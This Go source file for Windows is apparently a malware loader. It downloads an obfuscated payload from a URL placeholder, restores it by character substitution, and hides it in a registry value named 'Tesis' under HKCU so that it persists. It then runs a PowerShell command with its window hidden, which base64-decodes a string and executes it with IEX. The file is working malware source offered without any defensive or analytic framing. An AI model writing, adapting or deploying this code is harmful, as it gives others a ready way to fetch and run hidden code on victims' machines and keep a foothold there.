package main

import (
	"encoding/base64"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

func error_handler(e error) {
	if e != nil {
		os.Exit(1)
	}
}

// программа главная
func main() {
	CreateREGG(DownCode("<URL>"))
	Power("$VARR = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String(''))\nIEX $VARR")
}
func расшифровка(value string) string {
	data := base64.StdEncoding.EncodeToString([]byte(value))
	return data
}
func кодировка(value string) string {
	data, err := base64.StdEncoding.DecodeString(value)
	error_handler(err)

	return string(data)
}

func DownCode(data string) string {
	link, err := http.Get(data)

	error_handler(err)

	reqBody, err := ioutil.ReadAll(link.Body)

	return strings.Replace(strings.Replace(string(reqBody), "▄", кодировка("cQ=="), -1), "└", "A", -1)
}

func Reverse(s string) (result string) {
	for _, v := range s {
		result = string(v) + result
	}
	return
}

func CreateREGG(value string) {
	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Wow6432Node\`, registry.QUERY_VALUE|registry.SET_VALUE)

	if err != nil {
		log.Fatal(err)
	}
	if err := k.SetStringValue("Tesis", value); err != nil {
		log.Fatal(err)
	}
	if err := k.Close(); err != nil {
		log.Fatal(err)
	}

}

func Power(command string) ([]byte, error) {
	c := exec.Command("powershell.exe", command)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := c.CombinedOutput()
	if err != nil {
		return nil, err
	}

	return output, err
}
